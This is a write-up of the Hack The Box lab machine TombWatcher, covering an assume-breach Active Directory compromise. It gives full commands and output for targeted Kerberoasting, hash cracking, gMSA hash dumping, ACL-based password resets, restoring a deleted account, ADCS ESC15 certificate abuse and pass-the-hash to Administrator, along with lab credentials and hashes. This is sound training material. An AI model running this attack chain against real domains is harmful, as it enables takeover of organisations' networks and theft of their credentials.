---
title: HTB - TombWatcher
date: 2025-10-12 23:59:00 +0000
toc: true
categories: [windows, active directory]
tags: [kerberoasting, gmsa, ESC15, genericall, ForceChangePassword, writeowner]
media_subpath: /assets/img/tombwatcher
image: tombwatcher.png
description: in this assume breach scenario, we will abuse the write spn right that the user john has over alfred to get a service ticket encrypted with alfred's passwrod and then crack it with hashcat after that we will retrieve the gMSA account ntlm hash and use this account to change sam's password, next we will change john's password by abusing the writeowner privilege that the user sam has over john then we operate as john to restore the user cert_admin from deleted objects and finally use the cert_admin account to compromise the administrator user by expoiting the ADCS ESC15 vulnerability.
---
## Alfred - Kerberoasting
from the nmap scan results, we can see that our target is a windows domain controller with the usual services running
```shell
deb@debian:~/Desktop/htb/TombWatcher$ nmap -sV -sC 10.10.11.72
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-04 09:25 CEST
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 09:27 (0:00:00 remaining)
Nmap scan report for 10.10.11.72
Host is up (0.23s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-04 03:25:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-07-04T03:27:20+00:00; -4h00m10s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-07-04T03:27:21+00:00; -4h00m10s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-07-04T03:27:20+00:00; -4h00m10s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-04T03:27:21+00:00; -4h00m09s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: -4h00m09s, deviation: 0s, median: -4h00m10s
| smb2-time: 
|   date: 2025-07-04T03:26:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.50 seconds
```
nothing out of the ordinary is found on the smb shares and the web application is just the default iis web page.
after gathering and analyzing active directory data in bloodhound, The user `henry` has the ability to write to the 
`serviceprincipalname` attribute of the user `alfred` as we can see below
![Desktop View](writespn-right.png){: width="1421" height="743" }
by adding a `serviceprincipalname` to `alfred`, we can get a service ticket encrypted with `alfred`'s passwrod and then crack it with
`hashcat`.
using the `targetedKerberoast.py` script, it will automate the process and prints a hash that we can crack.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data/bloodhound$ python3 ../../../tools/targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat --dc-ip 10.10.11.72
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e9d38a83a0346b015eef9030e2bec5ac$b9bb9462dba019c88fa5c4a5663aa96f4c224481d65c1e5498194007b8ae66a3c8c3c76848518b18f521bc4c3b3a62bc79950e25aef77eb2ce59cfbd2349d385a6caf1841e68d2283fcf56d072663e64efbf14a032892f7a9229681bf1aee69ec742560863b0199b0fa1e4e4383f7d501dc3ae8600b631f114a4aa911b633516b29d6f91139827e0fb3145f0153bd7029fe8d6f4d74d2583ad850a589d658488976a4bc34c40a6b07b0c3306434d289018144db15e85e21d3814d172eff075754798082b89cff50de2ed7d3620142fec4055663a1ed67afdcffcc0728464291effea2f50be13e818258a6e16781e187738067287cdaa0b09632b239e6beac257e651eceed19566e0365e5f7e7a4b310815eabf5c14d085a4bc38e2052136bd533c249068b59427bbcbf6ce60233585cea948af04776725faa89e4fff9507272f2ab7e61178a743ae8964dc4d551b79e8c60fdbade499891663c389936d997aadeacc23b0f157ec77ad11b4219a4a3502ed461b9f711b3ad80a9fea5dd08a10e7ab9d355bd4878d831e0c02725f4cd0407933550d203e5f45950ac705dc705b4adb1ab2aca69dcca774e988b9595599c78758a876a3e4d131bda258290cca12a1ee345c6cdd3f836e13138e9839d9e070ad0e08acad843c7fea2d512ab0106173dd6cd418cc16bedcd11d8956ac49141b1cb22b2eb78cf22e8797a31400d7a01707dd8c3d5d875ae03a092e4e766ca219c203ea945011c59ba58bde546983fd082abf8f5dde24c555d23a682d8324e26b0347fb4c05296fd4b608e409b7c0d27b1643b72b8961a222277c535fed944f82a18c5ffcdfa56c695423347d0b1b19fea6f9509112ab0048f0e5bab1a2dd5e61c25177dc8043e369e1986da86987e40040e26d9fbbd535861e3fa90175784aa6ee4a2b0242cdaa797807a7d707d8db0af6c50e63599cc3d7eef5a6855e099232742b162f828a3fd603cfae4c2f029b9e37e733bb3cbe57a2d6b8f85c27060be6410bf2bcf3709c86448b41ea3ed4105868e6714b1ceec1d7f1cbc3ce30208b9808b7e32d1b88dc0a0a05f3e9e2243bf2a0f189dc5799df7f677a1ca45a8e0b30181fae30d67763c5dd1f22d01d1e3ca04d869fd242990e1d4fda38ea99cf266fc05b75f36721c010535e3833a71d2dbbbdecb300cad5ec4fa99f0c765d555dc8239025fa5a519ef2a10172b7c0a42651deb899a382841f0b9ee31a94d489fc77fe7825365daad5b3d2d7117654bed052a4fc98ab53c5aa28281d5faa06fd9dfeeb04b32f9dd6ea7d6655fa849dee90f0499b7d4d9d91648a12c267f9074418aacf40a1b1f2f5084a51df20c74a295a31338810e785dae0f940e09fc311d4510ae6e98647cfd408cbe6015b9e5a27fb769237a4930d7609f2fdb19cf68084a6f4e766771cce027388cc6bc80b70c364e1aa2f0b501e733282036a4e74606fd5bab88d8a3438
[VERBOSE] SPN removed successfully for (Alfred)
```
now we can crack the hash and recover `alfred`'s password
```shell
deb@debian:~/Desktop/htb/TombWatcher/data$ hashcat -m 13100 /tmp/hash.txt ~/Desktop/htb/tools/lists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-5300U CPU @ 2.30GHz, 1436/2936 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /home/deb/Desktop/htb/tools/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e9d38a83a0346b015eef9030e2bec5ac$b9bb9462dba019c88fa5c4a5663aa96f4c224481d65c1e5498194007b8ae66a3c8c3c76848518b18f521bc4c3b3a62bc79950e25aef77eb2ce59cfbd2349d385a6caf1841e68d2283fcf56d072663e64efbf14a032892f7a9229681bf1aee69ec742560863b0199b0fa1e4e4383f7d501dc3ae8600b631f114a4aa911b633516b29d6f91139827e0fb3145f0153bd7029fe8d6f4d74d2583ad850a589d658488976a4bc34c40a6b07b0c3306434d289018144db15e85e21d3814d172eff075754798082b89cff50de2ed7d3620142fec4055663a1ed67afdcffcc0728464291effea2f50be13e818258a6e16781e187738067287cdaa0b09632b239e6beac257e651eceed19566e0365e5f7e7a4b310815eabf5c14d085a4bc38e2052136bd533c249068b59427bbcbf6ce60233585cea948af04776725faa89e4fff9507272f2ab7e61178a743ae8964dc4d551b79e8c60fdbade499891663c389936d997aadeacc23b0f157ec77ad11b4219a4a3502ed461b9f711b3ad80a9fea5dd08a10e7ab9d355bd4878d831e0c02725f4cd0407933550d203e5f45950ac705dc705b4adb1ab2aca69dcca774e988b9595599c78758a876a3e4d131bda258290cca12a1ee345c6cdd3f836e13138e9839d9e070ad0e08acad843c7fea2d512ab0106173dd6cd418cc16bedcd11d8956ac49141b1cb22b2eb78cf22e8797a31400d7a01707dd8c3d5d875ae03a092e4e766ca219c203ea945011c59ba58bde546983fd082abf8f5dde24c555d23a682d8324e26b0347fb4c05296fd4b608e409b7c0d27b1643b72b8961a222277c535fed944f82a18c5ffcdfa56c695423347d0b1b19fea6f9509112ab0048f0e5bab1a2dd5e61c25177dc8043e369e1986da86987e40040e26d9fbbd535861e3fa90175784aa6ee4a2b0242cdaa797807a7d707d8db0af6c50e63599cc3d7eef5a6855e099232742b162f828a3fd603cfae4c2f029b9e37e733bb3cbe57a2d6b8f85c27060be6410bf2bcf3709c86448b41ea3ed4105868e6714b1ceec1d7f1cbc3ce30208b9808b7e32d1b88dc0a0a05f3e9e2243bf2a0f189dc5799df7f677a1ca45a8e0b30181fae30d67763c5dd1f22d01d1e3ca04d869fd242990e1d4fda38ea99cf266fc05b75f36721c010535e3833a71d2dbbbdecb300cad5ec4fa99f0c765d555dc8239025fa5a519ef2a10172b7c0a42651deb899a382841f0b9ee31a94d489fc77fe7825365daad5b3d2d7117654bed052a4fc98ab53c5aa28281d5faa06fd9dfeeb04b32f9dd6ea7d6655fa849dee90f0499b7d4d9d91648a12c267f9074418aacf40a1b1f2f5084a51df20c74a295a31338810e785dae0f940e09fc311d4510ae6e98647cfd408cbe6015b9e5a27fb769237a4930d7609f2fdb19cf68084a6f4e766771cce027388cc6bc80b70c364e1aa2f0b501e733282036a4e74606fd5bab88d8a3438:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...8a3438
Time.Started.....: Fri Jul  4 07:12:24 2025 (0 secs)
Time.Estimated...: Fri Jul  4 07:12:24 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/deb/Desktop/htb/tools/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    17617 H/s (1.69ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344384 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> letmein
Hardware.Mon.#1..: Util: 51%

Started: Fri Jul  4 07:12:21 2025
Stopped: Fri Jul  4 07:12:26 2025
```
## Ansible_Dev$ - ReadGMSAPassword
The user `alfred` has the ability to add himself to the `infrastructure` group and the members of this group can retrieve the 
password hash for the `ansible_dev$` machine account as we can see below
![Desktop View](alfred-path.png){: width="1421" height="743" }
using `bloodyAD`, we can add `alfred` to the `infrastructure` group.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u alfred -p 'basketball' --host dc01 add groupMember infrastructure alfred 
[+] alfred added to infrastructure
```
after that, we can use `gMSADumper.py` to get the `NTLM` hash for the `ansible_dev$` account
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ python3 ../../tools/gMSADumper-main/gMSADumper.py -u alfred -p 'basketball' -l 10.10.11.72 -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
```
## Sam - ForceChangePassword
`ansible_dev$ account` has the capability to change `sam`'s password as we can see below
![Desktop View](sam-path.png){: width="1421" height="743" }
`sam`'s password is changed successfully to `P@ssw0rd!123` using `bloodyAD`
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u 'ansible_dev$' -p '00000000000000000000000000000000:4b21348ca4a9edff9689cdf75cbda439' --host dc01 set password sam 'P@ssw0rd!123'
[+] Password changed successfully!
```
## John - WriteOwner
The user `sam` has the ability to modify the `owner` of the user `john`, by changing the `ownership` to `sam`,  we can grant `sam` 
`genericALL` rights over `john` which will enable `sam` to change `john`'s password.
![Desktop View](john-path.png){: width="1421" height="743" }
we can set the owner to `sam` using `bloodyAD` like below
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u sam -p 'P@ssw0rd!123' --host dc01 set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```
grant `sam` `genericAll` right
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u sam -p 'P@ssw0rd!123' --host dc01 add genericAll john sam
[+] sam has now GenericAll on john
```
now, we can change `john`'s password.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u sam -p 'P@ssw0rd!123' --host dc01 set password john 'P@ssw0rd!123'
[+] Password changed successfully!
```
after changing `john`'s password, we can access the domain controller using `wirnm` beacuse `john` is in the `remote managment users`
 group.
![Desktop View](rmu.png){: width="1421" height="743" }
i will not use `john`'s password for the next steps, instead i will request a `tgt` and use it.
for this, we need to edit the `etc/krb5.conf` file like below
```shell
[libdefaults]
    default_realm = TOMBWATCHER.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
[realms]
    TOMBWATCHER.HTB = {
        kdc = dc01.tombwatcher.htb
        admin_server = dc01.tombwatcher.htb
    }

[domain_realm]
    .tombwatcher.htb = TOMBWATCHER.HTB
    tombwatcher.htb = TOMBWATCHER.HTB
```
now we can request the `tgt` using `kinit`
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ kinit john@TOMBWATCHER.HTB
Password for john@TOMBWATCHER.HTB:
```
now we can use `evil-winrm` we can access the domain controller and grab the `user` flag
```shell
deb@debian:~/Desktop/htb/TombWatcher/data$ evil-winrm -i dc01.tombwatcher.htb -r TOMBWATCHER.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
*Evil-WinRM* PS C:\Users\john\Documents>
```
## Cert_Admin - GenericAll
after some host enumeration in the winrm session, nothing is found.
checking `john`'s `outbound control objects` inside `bloodhound`, we can see that `john` has `genericAll` over the `ADCS OU`, 
however there is no object under this `ou`.
![Desktop View](adcs.png){: width="1421" height="743" }
retrieving the `nt security descriptor` of the `domain` using `bloodyAD`, we can see that the user `john` has an `access control entrie` 
that allows `john` to `restore deleted objects`.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -u henry -p 'H3nry_987TGV!' --host dc01 get object 'dc=tombwatcher,dc=htb' --resolve-sd

<skip>
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: john
nTSecurityDescriptor.ACL.3.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.3.ObjectType: Reanimate-Tombstones
<skip>
```
this means that maybe there is something deleted that we need to restore, let's check.
```shell
deb@debian:~/Desktop/htb/TombWatcher/data$ evil-winrm -i dc01.tombwatcher.htb -r TOMBWATCHER.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects -Properties * | Format-List DistinguishedName,Name,ObjectClass,whenChanged,lastKnownParent


DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
whenChanged       : 11/15/2024 7:56:00 PM
lastKnownParent   :

DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
whenChanged       : 11/15/2024 7:57:59 PM
lastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb

DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
whenChanged       : 11/16/2024 12:04:21 PM
lastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb

DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
whenChanged       : 7/5/2025 12:52:00 AM
lastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb

*Evil-WinRM* PS C:\Users\john\Documents>
```
a user called `cert_admin` is found and he was a `child` of the `ADCS OU`. let's restore this user.
```shell
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
*Evil-WinRM* PS C:\Users\john\Documents>
```
as we discovered above, `john` has `GenericAll` over `ADCS OU` and `cert_admin` is a `child` of this `OU`. this means we can make 
the user `cert_admin` `inheret` the `GenericAll` right which will enable `john`'s to change `cert_admin`'s password.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -k ccache=/tmp/krb5cc_1000 --host dc01 add genericAll 'ou=adcs,dc=tombwatcher,dc=htb' john
[+] john has now GenericAll on ou=adcs,dc=tombwatcher,dc=htb
```
now we can change `cert_admin`'s password
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ bloodyAD -k ccache=/tmp/krb5cc_1000 --host dc01 set password cert_admin 'P@ssw0rd!123'
[+] Password changed successfully!
```
## Administrator - ESC15
running `certipy` to check if there is any ADCS privilege escalation path, shows that there is `ESC15` path.
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ certipy -debug find -u cert_admin@tombwatcher.htb -p 'P@ssw0rd!123' -target 10.10.11.72 -stdout -vulnerable
Certipy v5.0.1 - by Oliver Lyak (ly4k)

<skip>
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
after exploiting `ESC15`, we will recieve the `administrator` `NTLM` hash
```shell
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ certipy req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd!123' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ certipy req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd!123' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
(python-env) deb@debian:~/Desktop/htb/TombWatcher/data$
```
now we can access the domain controller using `winrm` and grab the `root` flag
```shell
deb@debian:~/Desktop/htb/TombWatcher/data$ evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/4/2025   3:51 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop>
```







